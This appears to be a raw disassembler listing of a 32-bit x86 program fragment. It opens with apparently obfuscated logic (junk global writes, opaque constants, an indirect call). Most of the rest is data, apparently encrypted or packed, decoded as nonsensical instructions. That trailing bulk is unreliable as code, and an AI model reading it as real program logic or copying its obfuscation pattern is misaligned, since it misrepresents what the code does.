  402a81:	xor    ecx,edx
  402a83:	add    esi,DWORD PTR ds:0x429018
  402a89:	mov    esi,0x3272dd
  402a8e:	sub    DWORD PTR ds:0x42d004,0x41ed
  402a98:	push   edi
  402a99:	mov    edi,DWORD PTR [ebp+0x10]
  402a9c:	add    ecx,esi
  402a9e:	mov    DWORD PTR ds:0x42c014,0x852
  402aa8:	cmp    ecx,edi
  402aaa:	mov    DWORD PTR ds:0x42b014,0x2a3e
  402ab4:	je     0x404f9d
  402aba:	inc    ecx
  402abb:	mov    ecx,DWORD PTR [ebp-0x4]
  402abe:	and    DWORD PTR ds:0x42a010,0x0
  402ac8:	mov    edi,DWORD PTR ds:0x42a010
  402ace:	inc    edi
  402acf:	mov    DWORD PTR ds:0x42a010,edi
  402ad5:	cmp    DWORD PTR ds:0x42a010,0x2a
  402adc:	jne    0x402ae8
  402ae2:	call   DWORD PTR ds:0x42ed71
  402ae8:	cmp    DWORD PTR ds:0x42a010,0x1b
  402aef:	jb     0x402ac8
  402af5:	mov    edi,DWORD PTR ds:0x42c00c
  402afb:	sbb    DWORD PTR ds:0x42a01c,edi
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	xor    DWORD PTR ds:0x429010,0x457d
  402b0e:	xor    eax,eax
  402b10:	xor    DWORD PTR ds:0x42c010,0x42b010
  402b1a:	xor    ecx,edx
  402b1c:	add    DWORD PTR ds:0x429028,0x1d9a
  402b26:	add    ecx,esi
  402b28:	add    edi,0xfabdbeed
  402b2e:	mov    DWORD PTR ds:0x42d014,0x7361
  402b38:	adc    eax,0xffffffff
  402b3b:	xor    eax,0x0
  402b3e:	mov    DWORD PTR [ebp-0xc],eax
  402b41:	push   ebx
  402b42:	xor    ebx,ebx
  402b44:	xor    edi,0x8a29a127
  402b4a:	mov    eax,ecx
  402b4c:	add    eax,0xfabdbeed
  402b51:	adc    ebx,0xffffffff
  402b54:	xor    eax,0x8a29a127
  402b59:	xor    ebx,0x0
  402b5c:	cmp    eax,edi
  402b5e:	jne    0x404f2f
  402b64:	cmp    ebx,DWORD PTR [ebp-0xc]
  402b67:	je     0x404f97
  402b6d:	jmp    0x404f2f
  402b72:	mov    esi,0x3272dd
  402b77:	jmp    0x404f2f
  402b7c:	jmp    0x402b15
  402b7e:	iret   
  402b7f:	push   esi
  402b80:	jae    0x402b78
  402b82:	retf   
  402b83:	xchg   edi,eax
  402b84:	mov    al,ds:0xbf55e01a
  402b89:	pop    ds
  402b8a:	mov    eax,0x7a7a7a75
  402b8f:	jp     0x402b68
  402b91:	pop    edi
  402b92:	jp     0x402c0e
  402b94:	adc    eax,0x1921172c
  402b99:	and    eax,0x3c652f1b
  402b9e:	imul   esp,DWORD PTR [esi-0x4],0x6d6a6a67
  402ba5:	xor    al,ch
  402ba7:	fsubr  st(1),st
  402ba9:	push   eax
  402baa:	dec    eax
  402bab:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402baf:	pusha  
  402bb0:	ins    DWORD PTR es:[edi],dx
  402bb1:	pop    ecx
  402bb2:	iret   
  402bb3:	pop    ebp
  402bb4:	dec    edx
  402bb5:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  402bbc:	jg     0x402bf5
  402bbe:	jo     0x402b66
  402bc0:	jg     0x402b62
  402bc2:	mov    ds:0x66ff2c3b,al
  402bc7:	fdiv   st(2),st
  402bc9:	push   ebx
  402bca:	jg     0x402bea
  402bcc:	in     eax,dx
  402bcd:	cmp    ebp,ecx
  402bcf:	mov    edx,0xde1387ed
  402bd4:	mov    ebp,DWORD PTR [ecx]
  402bd6:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  402bdd:	fld    QWORD PTR [esp+edx*8]
  402be0:	push   cs
  402be1:	cli    
  402be2:	sbb    BYTE PTR es:[eax+0xc],cl
  402be6:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  402beb:	adc    eax,DWORD PTR [ecx+0x5]
  402bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bef:	(bad)  
  402bf0:	jmp    0x32b4573e
  402bf5:	enter  0xf95b,0x1a
  402bf9:	cli    
  402bfa:	js     0x402b9d
  402bfc:	arpl   bp,bx
  402bfe:	cwde   
  402bff:	pop    edi
  402c00:	mov    esp,DWORD PTR [ecx+0x31821407]
  402c06:	repz sahf 
  402c08:	cmp    al,0x72
  402c0a:	jae    0x402c17
  402c0c:	fisubr DWORD PTR ds:0x33348d52
  402c12:	push   esp
  402c13:	jecxz  0x402be4
  402c15:	mov    ch,BYTE PTR [ecx]
  402c17:	mov    DWORD PTR [eax+0x5188ccb7],esi
  402c1d:	in     al,0x45
  402c1f:	push   edx
  402c20:	dec    esp
  402c21:	or     al,0x3e
  402c23:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  402c2b:	rol    BYTE PTR [esi+edx*2],0xfd
  402c2f:	push   edx
  402c30:	push   esi
  402c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c32:	stc    
  402c33:	push   0x1d42f8bf
  402c38:	mov    bh,0xb8
  402c3a:	fstp   QWORD PTR [ebx]
  402c3c:	div    DWORD PTR [ebx+0x30]
  402c3f:	not    DWORD PTR [edx]
  402c41:	inc    eax
  402c42:	add    ebp,ebx
  402c44:	inc    ecx
  402c45:	add    edx,DWORD PTR [eax-0x249c50ec]
  402c4b:	push   es
  402c4c:	xor    BYTE PTR [ebp-0xd],dh
  402c4f:	stc    
  402c50:	test   ebp,0x5c188dae
  402c56:	sbb    edi,DWORD PTR [esi-0x231b0d7a]
  402c5c:	call   FWORD PTR [edi-0x39]
  402c5f:	pop    ds
  402c60:	test   ch,bl
  402c62:	test   DWORD PTR [eax+edx*2+0x4c],eax
  402c66:	fsub   QWORD PTR [edi+eiz*1-0x141280b8]
  402c6d:	mov    BYTE PTR [edx+edx*4+0x63],bl
  402c71:	into   
  402c72:	mov    eax,0x1bd0488a
  402c77:	das    
  402c78:	adc    ah,al
  402c7a:	xor    ebp,ebx
  402c7c:	push   edx
  402c7d:	out    0xbf,eax
  402c7f:	pop    esp
  402c80:	daa    
  402c81:	out    0xe2,eax
  402c83:	dec    ebx
  402c84:	daa    
  402c85:	dec    edi
  402c86:	mov    edx,DWORD PTR [eax+0x8]
  402c89:	pop    ds
  402c8a:	sub    eax,0xa86a9ea4
  402c8f:	or     al,0x54
  402c91:	imul   esp,DWORD PTR [eax-0x34e27b8a],0xe7a94a3c
  402c9b:	mov    edx,0x1d348d4
  402ca0:	adc    eax,0x3d796647
  402ca5:	mov    bh,0x45
  402ca7:	or     DWORD PTR [esi-0x13],0x25
  402cab:	imul   esp,DWORD PTR ds:0x32c07b0c,0xb88002cf
  402cb5:	xor    DWORD PTR [eax+ebp*1+0x5c],eax
  402cb9:	lods   eax,DWORD PTR ds:[esi]
  402cba:	xchg   edx,eax
  402cbb:	push   ecx
  402cbc:	jne    0x402d0d
  402cbe:	and    eax,0xd6f08c4b
  402cc3:	sbb    edi,DWORD PTR [edi]
  402cc5:	loopne 0x402d1d
  402cc7:	lds    esi,FWORD PTR [edx+ebp*8-0xdd5a792]
  402cce:	das    
  402ccf:	jl     0x402c6f
  402cd1:	sbb    eax,0x14d2ca61
  402cd6:	mov    ds:0x7ebd004d,eax
  402cdb:	inc    esp
  402cdc:	inc    ecx
  402cdd:	popa   
  402cde:	retf   
  402cdf:	ds mov ah,al
  402ce2:	aad    0xea
  402ce4:	bound  edi,QWORD PTR [edi]
  402ce6:	mov    WORD PTR [esi+0x155f497f],ss
  402cec:	ret    
  402ced:	inc    ebx
  402cee:	cmc    
  402cef:	ins    BYTE PTR es:[edi],dx
  402cf0:	ss adc ecx,0x63
  402cf4:	not    bl
  402cf6:	jg     0x402c82
  402cf8:	xchg   BYTE PTR [edi],dh
  402cfa:	mov    ebx,0x36ca6e41
  402cff:	jge    0x402cbd
  402d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d02:	inc    edx
  402d03:	(bad)  
  402d04:	cs cwde 
  402d06:	mov    bh,0xe7
  402d08:	in     ax,0xfc
  402d0b:	gs pop eax
  402d0d:	xlat   BYTE PTR ds:[ebx]
  402d0e:	or     DWORD PTR [edx],esi
  402d10:	sti    
  402d11:	sahf   
  402d12:	popf   
  402d13:	outs   dx,DWORD PTR ds:[esi]
  402d14:	iret   
  402d15:	add    al,0xe2
  402d17:	sbb    ecx,ecx
  402d19:	sub    al,0x57
  402d1b:	and    al,0x46
  402d1d:	ror    DWORD PTR [eax],0xa8
  402d20:	xchg   esp,eax
  402d21:	(bad)  
  402d22:	out    dx,eax
  402d23:	jo     0x402cf9
  402d25:	das    
  402d26:	in     al,dx
  402d27:	cmp    ch,cl
  402d29:	scas   al,BYTE PTR es:[edi]
  402d2a:	sbb    bh,ah
  402d2c:	lea    esi,[esi-0x11]
  402d2f:	in     al,dx
  402d30:	pushf  
  402d31:	dec    edi
  402d32:	jnp    0x402d52
  402d34:	dec    eax
  402d35:	pop    ss
  402d36:	enter  0x12ab,0x4c
  402d3a:	int    0xfd
  402d3c:	jmp    0xe7c5:0x90ebacd3
  402d43:	inc    eax
  402d44:	pop    esi
  402d45:	cmp    BYTE PTR [edi],ah
  402d47:	push   ds
  402d48:	daa    
  402d49:	stc    
  402d4a:	int    0xf3
  402d4c:	out    dx,eax
  402d4d:	dec    edi
  402d4e:	dec    ecx
  402d4f:	repnz outs dx,BYTE PTR ds:[si]
  402d52:	scas   eax,DWORD PTR es:[edi]
  402d53:	pop    ds
  402d54:	push   ds
  402d55:	or     bl,BYTE PTR [edx]
  402d57:	shr    esp,0xe
  402d5a:	mov    eax,0x96754d9b
  402d5f:	lahf   
  402d60:	cld    
  402d61:	mov    ebx,DWORD PTR [ebp+0xcf16793]
  402d67:	dec    ebx
  402d68:	or     edi,ecx
  402d6a:	pop    ebx
  402d6b:	outs   dx,DWORD PTR ds:[esi]
  402d6c:	xlat   BYTE PTR ds:[ebx]
  402d6d:	xor    BYTE PTR [esp+eiz*4+0x382d8bb1],bl
  402d74:	sbb    eax,0x276df711
  402d79:	add    ecx,esi
  402d7b:	cmp    bh,BYTE PTR [edx-0x73]
  402d7e:	dec    esi
  402d7f:	mov    al,0x73
  402d81:	sbb    BYTE PTR [eax-0x5d],cl
  402d84:	inc    ecx
  402d85:	mov    ds:0xd3f0cf96,eax
  402d8a:	push   0x7b65080d
  402d8f:	retf   
  402d90:	or     DWORD PTR [edx],0x67
  402d93:	mov    ebx,0xabc01361
  402d98:	jmp    0xceb3857a
  402d9d:	rcl    DWORD PTR ds:0x3055b5f2,cl
  402da3:	ficomp DWORD PTR [ebx+0x5]
  402da6:	inc    ecx
  402da7:	cmp    DWORD PTR [edi-0x66],esp
  402daa:	xchg   ebp,eax
  402dab:	ja     0x402d56
  402dad:	(bad)  [ebx-0x7f]
  402db0:	or     eax,0xb0498c53
  402db5:	ja     0x402dac
  402db7:	dec    esi
  402db8:	int3   
  402db9:	outs   dx,BYTE PTR ds:[esi]
  402dba:	es in  eax,dx
  402dbc:	aam    0x33
  402dbe:	and    eax,DWORD PTR [ebp-0x2812a5be]
  402dc4:	dec    esi
  402dc5:	imul   esp,esi,0xffffffaa
  402dc8:	pop    ebp
  402dc9:	je     0x402deb
  402dcb:	adc    al,0x62
  402dcd:	(bad)  
  402dce:	ss dec eax
  402dd0:	in     al,0x3d
  402dd2:	mov    dl,BYTE PTR ds:0x5f47c9d1
  402dd8:	sub    al,0x23
  402dda:	and    ch,bh
  402ddc:	shr    bh,1
  402dde:	push   esp
  402ddf:	lea    eax,[edx]
  402de1:	mov    eax,ds:0x751f9ac7
  402de6:	lock fdivr QWORD PTR [edi-0x6f]
  402dea:	enter  0x788b,0x45
  402dee:	xor    bh,BYTE PTR [edi+0x6664385b]
  402df4:	mov    eax,ds:0x7ab6baca
  402df9:	or     eax,0xbfd45063
  402dfe:	mov    WORD PTR [esi],?
  402e00:	pushf  
  402e01:	jo     0x402df4
  402e03:	jb     0x402d92
  402e05:	call   0x128259d0
  402e0a:	pop    esp
  402e0b:	fwait
  402e0c:	imul   ebx,DWORD PTR [edx-0x387ec012],0x89121ebc
  402e16:	cli    
  402e17:	fsub   QWORD PTR [ecx]
  402e19:	sahf   
  402e1a:	jmp    0x2833329e
  402e1f:	mov    bh,0xa6
  402e21:	fst    QWORD PTR [eax+0x1f0c0110]
  402e27:	add    al,0x7f
  402e29:	call   0xeb0e1c10
  402e2e:	mov    esp,0x79f7bc8c
  402e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e34:	loope  0x402e47
  402e36:	cmp    al,0xa2
  402e39:	test   eax,ecx
  402e3b:	int    0xf7
  402e3d:	or     ah,dh
  402e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e40:	aam    0xd1
  402e42:	scas   eax,DWORD PTR es:[edi]
  402e43:	mov    eax,0x54d1013
  402e48:	and    esi,ebx
  402e4a:	sahf   
  402e4b:	int    0xe
  402e4d:	and    BYTE PTR [edx+edx*1-0x3f],dl
  402e51:	sub    dh,BYTE PTR [ebx]
  402e53:	jmp    0x402e36
  402e55:	mov    DWORD PTR [eax],edi
  402e57:	inc    edx
  402e58:	dec    ebx
  402e59:	mov    al,ds:0xf3fe465a
  402e5e:	iret   
  402e5f:	jo     0x402e24
  402e61:	mov    esi,0x6f91313b
  402e66:	xor    DWORD PTR [ebx+0x7d4f2f4d],esi
  402e6c:	out    dx,eax
  402e6d:	adc    cl,BYTE PTR [edx]
  402e6f:	sbb    al,0x84
  402e71:	(bad)  
  402e72:	jmp    0xaf6a:0x29f913cd
  402e79:	(bad)  
  402e7a:	iret   
  402e7b:	push   edx
  402e7c:	or     eax,0xf1d79402
  402e81:	stc    
  402e82:	jns    0x402eb3
  402e84:	mov    cl,BYTE PTR [edi-0x5d6c5c3f]
  402e8a:	dec    esp
  402e8b:	sbb    DWORD PTR ds:0x3054c26c,0x8877f9e5
  402e95:	mov    cl,BYTE PTR [ebx]
  402e97:	sub    al,0xc6
  402e99:	femms  
  402e9b:	shl    BYTE PTR [ebp+eax*2-0x50],1
  402e9f:	pop    ebx
  402ea0:	call   0x78c9576
  402ea5:	test   BYTE PTR [edx+0x58],al
  402ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea9:	repz mov bh,0x82
  402eac:	es cs jno 0x402e76
  402eb0:	es push es
  402eb2:	sbb    BYTE PTR [edx],cl
  402eb4:	sbb    ecx,esi
  402eb6:	dec    ebp
  402eb7:	or     DWORD PTR [esi],0xffffffca
  402eba:	pop    edx
  402ebb:	cmc    
  402ebc:	pushf  
  402ebd:	sub    eax,0x7a4cf202
  402ec2:	push   esp
  402ec3:	(bad)  
  402ec4:	dec    ebx
  402ec5:	lds    ebx,FWORD PTR [edi+eiz*2-0x63]
  402ec9:	adc    eax,0xa08c160d
  402ece:	cs cdq 
  402ed0:	xlat   BYTE PTR ds:[ebx]
  402ed1:	mov    eax,ds:0x3ef572d6
  402ed6:	sti    
  402ed7:	rol    DWORD PTR [ecx+0x2d],0xe
  402edb:	imul   esi,DWORD PTR [ebx-0x7a82d13a],0xe16f75c2
  402ee5:	xchg   edx,eax
  402ee6:	push   ebp
  402ee7:	fild   DWORD PTR [ebx]
  402ee9:	xchg   ebx,eax
  402eea:	shl    BYTE PTR [ecx+0x1c],0x56
  402eee:	and    ah,BYTE PTR [edx+0x1f226778]
  402ef4:	das    
  402ef5:	jl     0x402ec6
  402ef7:	and    al,0x88
  402ef9:	xor    eax,0x9a9d218a
  402efe:	in     eax,dx
  402eff:	(bad)  
  402f01:	gs test eax,0x3475b17c
  402f07:	sub    DWORD PTR [ecx-0xb8838ca],esi
  402f0d:	cs ins DWORD PTR es:[edi],dx
  402f0f:	sar    dl,0x88
  402f12:	cmp    ebx,DWORD PTR [ebx+0x68]
  402f15:	jmp    0x402f17
  402f17:	lea    esi,[ebx+0x3b358909]
  402f1d:	das    
  402f1e:	fisttp WORD PTR [ebp-0x76]
  402f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f22:	int3   
  402f23:	stos   BYTE PTR es:[edi],al
  402f24:	fidiv  DWORD PTR [edi-0xd037e32]
  402f2a:	sub    al,0xcc
  402f2c:	cmp    bh,BYTE PTR [edi+0x548733a2]
  402f32:	popa   
  402f33:	lea    ecx,[eax-0x5b1f0e44]
  402f39:	hlt    
  402f3a:	xchg   bh,ch
  402f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f3d:	xor    dh,BYTE PTR [ebx]
  402f3f:	sub    ecx,0x3
  402f42:	pop    ds
  402f43:	ds dec esp
  402f45:	aam    0x56
  402f47:	call   DWORD PTR [edi+0x3a]
  402f4a:	scas   al,BYTE PTR es:[edi]
  402f4b:	sbb    BYTE PTR [edx+0x60],ah
  402f4e:	sub    eax,0x46373aa7
  402f53:	adc    ch,BYTE PTR [esi-0x4531ecae]
  402f59:	pop    ds
  402f5a:	stc    
  402f5b:	or     ah,BYTE PTR [ecx+0x7b]
  402f5e:	test   eax,0xab471f2c
  402f63:	xchg   edi,eax
  402f64:	lea    ebx,[eax]
  402f66:	jl     0x402f2b
  402f68:	cmp    eax,0x3667f85d
  402f6d:	jo     0x402f33
  402f6f:	lods   al,BYTE PTR ds:[esi]
  402f70:	pushf  
  402f71:	rcl    BYTE PTR [ebx],0x63
  402f74:	push   edi
  402f75:	(bad)  
  402f76:	jo     0x402f91
  402f78:	test   BYTE PTR [ecx],bh
  402f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7c:	xchg   BYTE PTR [eax+0x33],ch
  402f7f:	aad    0xa3
  402f81:	fdivr  st(5),st
  402f83:	aaa    
  402f84:	into   
  402f85:	jle    0x402ff9
  402f87:	mov    edi,0x9f10cb78
  402f8c:	mov    eax,ds:0xe130fea
  402f91:	les    edx,FWORD PTR [eax]
  402f93:	and    eax,0xd0030e7
  402f98:	mov    esp,DWORD PTR ds:0x2cba8565
  402f9e:	cmp    DWORD PTR [ebx+eiz*2-0x1e06feeb],eax
  402fa5:	mov    bl,0xc2
  402fa7:	jmp    0x2d7dd4f4
  402fac:	add    eax,0x9ac3546c
  402fb1:	pop    es
  402fb2:	js     0x403024
  402fb4:	out    0x93,eax
  402fb6:	int3   
  402fb7:	mov    bh,0xa8
  402fb9:	rol    bh,cl
  402fbb:	add    DWORD PTR [edx-0x781971bb],edx
  402fc1:	or     DWORD PTR [ebx-0x76955e04],eax
  402fc7:	adc    ebx,edx
  402fc9:	mov    ebx,0x832bc0c8
  402fce:	inc    eax
  402fcf:	add    DWORD PTR [ecx-0x35f23d66],ecx
  402fd5:	daa    
  402fd6:	sub    dl,al
  402fd8:	cld    
  402fd9:	out    0x5d,al
  402fdb:	or     DWORD PTR [ebp-0x5],eax
  402fde:	mov    eax,ds:0xc97bbbec
  402fe3:	add    eax,0xbd800d88
  402fe8:	mov    esp,0xca6babc0
  402fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fee:	ret    
  402fef:	push   cs
  402ff0:	xchg   BYTE PTR [eax+ebx*2],ch
  402ff3:	(bad)  
  402ff4:	ss xor eax,0x3b8fd2c
  402ffa:	push   cs
  402ffb:	outs   dx,BYTE PTR ds:[esi]
  402ffc:	(bad)  
  402ffd:	mov    dh,0x98
  402fff:	push   esp
  403000:	imul   ecx,DWORD PTR [ebp-0x50fcd3a5],0xffffffe4
  403007:	stc    
  403008:	and    eax,0x9d15ece5
  40300d:	pusha  
  40300e:	pushf  
  40300f:	clc    
  403010:	push   ds
  403011:	int    0xaa
  403013:	push   es
  403014:	push   es
  403015:	ja     0x40304c
  403017:	imul   ebp,DWORD PTR [esi+ecx*4+0x30],0xffffffa6
  40301c:	dec    esi
  40301d:	jno    0x403087
  40301f:	int3   
  403020:	adc    eax,0x53708a0f
  403025:	gs jnp 0x402fb0
  403028:	xchg   esi,eax
  403029:	mov    ebx,0x6077225f
  40302e:	dec    ebx
  40302f:	xchg   DWORD PTR [edi],ebp
  403031:	fisttp DWORD PTR [ecx-0x7c]
  403034:	jmp    0x54a3fdf1
  403039:	cld    
  40303a:	out    dx,al
  40303b:	mov    ah,0xbc
  40303d:	aam    0x0
  40303f:	dec    ecx
  403040:	dec    BYTE PTR [eax]
  403042:	xchg   ebp,eax
  403043:	rcr    DWORD PTR [ebx-0x172a92ce],cl
  403049:	fsubr  QWORD PTR [edx-0x7b]
  40304c:	sub    bh,BYTE PTR [eax+0x2ccd6414]
  403052:	ins    BYTE PTR es:[edi],dx
  403053:	(bad)  
  403054:	mul    BYTE PTR [edx]
  403056:	jg     0x403093
  403058:	jns    0x40302f
  40305a:	mov    WORD PTR [edi+0x49bbfb75],gs
  403060:	int    0x3d
  403062:	push   eax
  403063:	adc    al,0x59
  403065:	ret    
  403066:	scas   eax,DWORD PTR es:[edi]
  403067:	mov    al,ds:0xc2b0e31e
  40306c:	mov    dh,0x1
  40306e:	push   cs
  40306f:	inc    edx
  403070:	inc    ebx
  403071:	ret    0xe1cd
  403074:	push   ds
  403075:	rol    ah,0x54
  403078:	jns    0x403082
  40307a:	pop    es
  40307b:	cli    
  40307c:	sbb    DWORD PTR [edi-0x2087bfac],edx
  403082:	jne    0x403041
  403084:	pop    esi
  403085:	add    al,BYTE PTR [edi-0x5a89d166]
  40308b:	adc    esi,edx
  40308d:	adc    DWORD PTR [ecx+0x22b4a130],edi
  403093:	mov    al,ds:0x956ed806
  403098:	fiadd  DWORD PTR [edx]
  40309a:	call   0xed32299f
  40309f:	sub    ebp,ecx
  4030a1:	aad    0xeb
  4030a3:	cwde   
  4030a4:	and    esi,DWORD PTR [esi-0x55]
  4030a7:	jbe    0x403098
  4030a9:	xchg   ebp,eax
  4030aa:	loope  0x4030ba
  4030ac:	and    DWORD PTR [eax],esp
  4030ae:	mov    esp,0xd715a383
  4030b3:	lahf   
  4030b4:	xchg   edi,eax
  4030b5:	cmp    ch,al
  4030b7:	adc    BYTE PTR [esi-0x72],dl
  4030ba:	sahf   
  4030bb:	scas   al,BYTE PTR es:[edi]
  4030bc:	lods   eax,DWORD PTR ds:[esi]
  4030bd:	xchg   DWORD PTR [esi],ebp
  4030bf:	in     eax,dx
  4030c0:	(bad)  
  4030c1:	sub    BYTE PTR [esi+0x738a88df],dh
  4030c7:	jge    0x403081
  4030c9:	mov    ds:0x2644e63b,al
  4030ce:	mov    al,ds:0x9eb672a4
  4030d3:	pop    DWORD PTR [eax-0x401ba5c2]
  4030d9:	inc    edx
  4030da:	mov    ebp,eax
  4030dc:	and    ah,BYTE PTR [ecx-0x4a]
  4030df:	fs adc cl,dh
  4030e2:	(bad)  
  4030e3:	mov    al,0x24
  4030e5:	not    BYTE PTR [esp+ebx*1-0x78]
  4030e9:	push   ss
  4030ea:	mov    edx,esi
  4030ec:	add    eax,0x69d8857d
  4030f1:	sbb    al,BYTE PTR [edi-0x201b7c46]
  4030f7:	sub    ecx,DWORD PTR [ebx+ecx*1-0x53]
  4030fb:	out    0x92,eax
  4030fd:	fstp   TBYTE PTR ds:0x47448e99
  403103:	retf   
  403104:	xchg   esi,eax
  403105:	gs push es
  403107:	xor    BYTE PTR [edx+0xc],dh
  40310a:	xchg   ecx,eax
  40310b:	jle    0x40315c
  40310d:	andps  xmm5,XMMWORD PTR [ecx+edx*4]
  403111:	xchg   BYTE PTR [esi-0x4f],bl
  403114:	int3   
  403115:	rcr    BYTE PTR [esi+0x3e0fdd1e],cl
  40311b:	xchg   BYTE PTR [esi],bl
  40311d:	cmp    eax,0x73e5bfce
  403122:	hlt    
  403123:	sar    DWORD PTR [edi+0x46d5728f],1
  403129:	jnp    0x403110
  40312b:	out    dx,al
  40312c:	mov    eax,ds:0x590c83c2
  403131:	popa   
  403132:	adc    DWORD PTR [eax-0x55],0x1e
  403136:	jnp    0x4030f9
  403138:	es sub eax,0x5f92ceb2
  40313e:	add    al,0x67
  403140:	mov    eax,0x963506a6
  403145:	out    dx,eax
  403146:	inc    ebx
  403147:	jg     0x4031ac
  403149:	or     eax,0xf0fc5f7e
  40314e:	lods   al,BYTE PTR ds:[esi]
  40314f:	data16 and ah,bh
  403152:	test   esp,0x1e180458
  403158:	pop    edi
  403159:	jne    0x4030e5
  40315b:	cwde   
  40315c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40315d:	(bad)  
  40315e:	sub    ah,BYTE PTR [eax-0x69]
  403161:	mov    ecx,0xed730dd1
  403166:	add    BYTE PTR [eax+0x69ba6620],bh
  40316c:	(bad)  
  40316d:	retf   0x924a
  403170:	mov    ds:0xf3c1dff0,al
  403175:	xchg   esi,eax
  403176:	mov    eax,DWORD PTR [edi-0x1]
  403179:	out    dx,eax
  40317a:	dec    ebx
  40317b:	lock popf 
  40317d:	dec    ebx
  40317e:	xor    dh,0x8a
  403181:	and    dh,ah
  403183:	mov    dh,0x27
  403185:	inc    esp
  403186:	sub    esp,DWORD PTR [ebx]
  403188:	in     eax,0x43
  40318a:	push   edi
  40318b:	mov    al,0x9f
  40318d:	lock int3 
  40318f:	(bad)  
  403190:	lods   al,BYTE PTR ds:[esi]
  403191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403192:	fwait
  403193:	and    al,0x2a
  403195:	rol    ah,cl
  403197:	inc    esi
  403198:	cmp    eax,0xf98f196a
  40319d:	hlt    
  40319e:	xor    eax,0x63035b09
  4031a3:	arpl   WORD PTR [edx-0x3214a3d2],si
  4031a9:	(bad)  
  4031aa:	call   0x689951de
  4031af:	js     0x4031c7
  4031b1:	icebp  
  4031b2:	sahf   
  4031b3:	stc    
  4031b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031b5:	in     al,0x54
  4031b7:	add    eax,0x9b6e0d7f
  4031bc:	mov    edi,0x86d4689b
  4031c1:	or     edi,DWORD PTR [ecx]
  4031c3:	mov    WORD PTR [edi-0x1b],cs
  4031c6:	and    al,0xd6
  4031c8:	gs (bad) 
  4031ca:	pop    eax
  4031cb:	sub    esi,DWORD PTR [eax+0x4ce67ae]
  4031d1:	test   al,0xbf
  4031d3:	pusha  
  4031d4:	retf   0x329e
  4031d7:	dec    ebx
  4031d8:	xchg   edi,eax
  4031d9:	push   esi
  4031da:	jbe    0x4031bc
  4031dc:	or     eax,0x38b40dab
  4031e1:	ja     0x403235
  4031e3:	cmp    al,0x24
  4031e5:	add    BYTE PTR [eax-0x4896d434],0x69
  4031ec:	rcl    DWORD PTR [eax-0x39],cl
  4031ef:	adc    al,0x36
  4031f1:	test   BYTE PTR [eax],0xb2
  4031f4:	scas   al,BYTE PTR es:[edi]
  4031f5:	(bad)  
  4031f6:	std    
  4031f7:	cld    
  4031f8:	add    al,0xb2
  4031fa:	retf   
  4031fb:	cld    
  4031fc:	outs   dx,BYTE PTR ds:[esi]
  4031fd:	call   0x9e69:0x4ab58309
  403204:	out    dx,eax
  403205:	sbb    eax,eax
  403207:	and    eax,0x2e70acca
  40320c:	xor    DWORD PTR [ecx+0x40d0d312],ebx
  403212:	jae    0x4031b6
  403214:	(bad)  
  403215:	mov    eax,ds:0x8ab3d7b1
  40321a:	xchg   esi,eax
  40321b:	mov    dl,0xa5
  40321d:	in     eax,0x3f
  40321f:	xor    eax,0x7e35a809
  403224:	cli    
  403225:	jmp    0xbec0:0xf1603f1b
  40322c:	clc    
  40322d:	aaa    
  40322e:	das    
  40322f:	bound  esp,QWORD PTR [edx+0x16dc7cbe]
  403235:	fnstenv [ecx+eax*1+0x37]
  403239:	xor    esp,DWORD PTR ds:0x6b785808
  40323f:	fcmovnbe st,st(6)
  403241:	cmc    
  403242:	out    0xc9,al
  403244:	mov    bl,dh
  403246:	gs pusha 
  403248:	gs xchg edx,eax
  40324a:	pop    edx
  40324b:	scas   al,BYTE PTR es:[edi]
  40324c:	xchg   edi,eax
  40324d:	and    al,0xf4
  40324f:	sbb    BYTE PTR [ecx-0x6e2a6577],cl
  403255:	jo     0x4031dd
  403257:	dec    ebx
  403258:	das    
  403259:	shr    BYTE PTR [ebp+0x251a198b],cl
  40325f:	test   dh,al
  403261:	cmp    al,0x40
  403263:	and    ecx,ebx
  403265:	inc    eax
  403266:	(bad)  
  403267:	enter  0xee02,0x3e
  40326b:	mov    ch,0x8e
  40326d:	jg     0x40323f
  40326f:	mov    dh,0xe
  403271:	inc    eax
  403272:	into   
  403273:	lock aas 
  403275:	fcomp  st(2)
  403277:	nop
  403278:	mov    ch,0x8c
  40327a:	mov    al,BYTE PTR [esi-0x44]
  40327d:	push   ebp
  40327e:	cli    
  40327f:	xor    DWORD PTR [edx],edx
  403281:	sub    eax,0x3014a03c
  403286:	in     eax,0x36
  403288:	call   0x443a:0xd8268839
  40328f:	xor    bl,0xd3
  403292:	push   edi
  403293:	pusha  
  403294:	sub    bh,ch
  403296:	retf   0xc354
  403299:	xor    eax,0x7b1563a8
  40329e:	push   cs
  40329f:	jne    0x403266
  4032a1:	fwait
  4032a2:	or     eax,0x31d3db56
  4032a7:	inc    edi
  4032a8:	dec    edi
  4032a9:	mov    cl,0xf6
  4032ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ac:	sub    al,0x6
  4032ae:	adc    bl,al
  4032b0:	pop    ecx
  4032b1:	fwait
  4032b2:	dec    ebp
  4032b3:	fidivr DWORD PTR [esi+0x56529510]
  4032b9:	or     ecx,ebx
  4032bb:	push   ebp
  4032bc:	imul   ebp,DWORD PTR [edx-0x17ab5d0c],0xe141baad
  4032c6:	outs   dx,DWORD PTR ds:[esi]
  4032c7:	pop    esi
